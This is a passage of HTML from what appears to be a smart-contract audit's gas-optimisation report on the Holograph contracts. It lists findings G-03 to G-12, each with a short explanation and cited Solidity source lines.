href=\"#g-03-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" aria-label=\"g 03 using  0 costs more gas than  0 when used on a uint in a require statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Using > 0 costs more gas than != 0 when used on a uint in a require() statement</h2>\n<p>When dealing with unsigned integer types, comparisons with != 0 are cheaper then with > 0. This change saves 6 gas per instance</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::309 =&gt; require(_operatorJobs[hash] &gt; 0, &quot;HOLOGRAPH: invalid job&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::350 =&gt; require(timeDifference &gt; 0, &quot;HOLOGRAPH: operator has time&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 =&gt; require(tokenId &gt; 0, &quot;ERC721: token id cannot be zero&quot;);</span></span></code></pre>\n<h2 id=\"g-04-long-revert-strings\" style=\"position:relative;\"><a href=\"#g-04-long-revert-strings\" aria-label=\"g 04 long revert strings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Long Revert Strings</h2>\n<p>Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.</p>\n<p>If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::411 =&gt; require(balance &gt; 10000, &quot;PA1D: Not enough tokens to transfer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::435 =&gt; require(balance &gt; 10000, &quot;PA1D: Not enough tokens to transfer&quot;);</span></span></code></pre>\n<h2 id=\"g-05-use-calldata-instead-of-memory\" style=\"position:relative;\"><a href=\"#g-05-use-calldata-instead-of-memory\" aria-label=\"g 05 use calldata instead of memory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Use calldata instead of memory</h2>\n<p>Use calldata instead of memory for function parameters saves gas if the function argument is only read.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::162 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::143 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::240 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::140 =&gt; function init(bytes memory initPayload) external virtual override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::140 =&gt; function init(bytes memory initPayload) external virtual override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::218 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::238 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::147 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::173 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::185 =&gt; function initPA1D(bytes memory initPayload) external returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::365 =&gt; function _getTokenAddress(string memory tokenName) private view returns (address tokenAddress) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::683 =&gt; function getTokenAddress(string memory tokenName) public view returns (address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::158 =&gt; function init(bytes memory initPayload) external override returns (bytes4) {</span></span></code></pre>\n<h2 id=\"g-06-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g-06-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g 06 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Functions guaranteed to revert when called by normal users can be marked payable</h2>\n<p>If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::452 =&gt; function setFactory(address factory) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::472 =&gt; function setHolograph(address holograph) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::502 =&gt; function setOperator(address operator) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::522 =&gt; function setRegistry(address registry) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::280 =&gt; function setHolograph(address holograph) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::300 =&gt; function setRegistry(address registry) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::949 =&gt; function setBridge(address bridge) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::969 =&gt; function setHolograph(address holograph) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::989 =&gt; function setInterfaces(address interfaces) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1009 =&gt; function setMessagingModule(address messagingModule) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1029 =&gt; function setRegistry(address registry) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1049 =&gt; function setUtilityToken(address utilityToken) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::380 =&gt; function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::415 =&gt; function holographBridgeMint(address to, uint256 amount) external onlyBridge returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::549 =&gt; function sourceBurn(address from, uint256 amount) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::556 =&gt; function sourceMint(address to, uint256 amount) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::563 =&gt; function sourceMintBatch(address[] calldata wallets, uint256[] calldata amounts) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::399 =&gt; function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::500 =&gt; function sourceBurn(uint256 tokenId) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::508 =&gt; function sourceMint(address to, uint224 tokenId) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::520 =&gt; function sourceGetChainPrepend() external view onlySource returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::577 =&gt; function sourceTransfer(address to, uint256 tokenId) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::320 =&gt; function setBridge(address bridge) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::340 =&gt; function setInterfaces(address interfaces) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::360 =&gt; function setLZEndpoint(address lZEndpoint) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::380 =&gt; function setOperator(address operator) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::441 =&gt; function setBaseGas(uint256 baseGas) external onlyAdmin {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::470 =&gt; function setGasPerByte(uint256 gasPerByte) external onlyAdmin {</span></span></code></pre>\n<h2 id=\"g-07-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#g-07-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"g 07 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Empty blocks should be removed or emit something</h2>\n<p>The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::155 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::136 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::233 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1209 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::133 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::212 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::133 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::212 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::211 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::251 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::231 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::962 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::140 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::223 =&gt; receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::166 =&gt; constructor() {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::151 =&gt; constructor() {}</span></span></code></pre>\n<h2 id=\"g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g 08 usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</h2>\n<p>When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::208 =&gt; uint32 private _operatorTempStorageCounter;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::181 =&gt; uint8 private _decimals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::160 =&gt; uint16 private _bps;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::265 =&gt; (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::289 =&gt; (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);</span></span></code></pre>\n<h2 id=\"g-09-using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-09-using-bools-for-storage-incurs-overhead\" aria-label=\"g 09 using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Using bools for storage incurs overhead</h2>\n<p>Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot’s contents, replace the bits taken up by the boolean, and then write back. This is the compiler’s defense against contract upgrades and pointer aliasing, and it cannot be disabled.\nUse uint256(1) and uint256(2) for true/false instead</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::198 =&gt; mapping(bytes32 =&gt; bool) private _failedJobs;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 =&gt; mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::206 =&gt; mapping(uint256 =&gt; bool) private _burnedTokens;</span></span></code></pre>\n<h2 id=\"g-10-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-for-example-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g-10-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-for-example-when-used-in-for--and-while-loops\" aria-label=\"g 10 ii should be uncheckediuncheckedi when it is not possible for them to overflow for example when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, for example when used in for- and while-loops</h2>\n<p>The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::781 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::871 =&gt; for (uint256 i = _operatorPods.length; i &lt;= pod; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 =&gt; for (uint256 i = 0; i &lt; wallets.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::307 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::323 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::340 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::356 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::394 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::414 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::432 =&gt; for (uint256 t = 0; t &lt; tokenAddresses.length; t++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::437 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::454 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::474 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span></code></pre>\n<h2 id=\"g-11-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g-11-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g 11 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] <x> += <y> costs more gas than <x> = <x> + <y> for state variables</h2>\n<p>use <x> = <x> + <y> or <x> = <x> - <y> instead to save gas</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::328 =&gt; v += 27;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::378 =&gt; _bondedAmounts[job.operator] -= amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::382 =&gt; _bondedAmounts[msg.sender] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::834 =&gt; _bondedAmounts[operator] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1175 =&gt; position -= threshold;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::1177 =&gt; current += (current / _operatorThresholdDivisor) * (position / _operatorThresholdStep);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::633 =&gt; _totalSupply -= amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::685 =&gt; _totalSupply += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::686 =&gt; _balances[to] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::702 =&gt; _balances[recipient] += amount;</span></span></code></pre>\n<h2 id=\"g-12-abiencode-is-less-efficient-than-abiencodepacked\" style=\"position:relative;\"><a href=\"#g-12-abiencode-is-less-efficient-than-abiencodepacked\" aria-label=\"g 12 abiencode is less efficient than abiencodepacked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 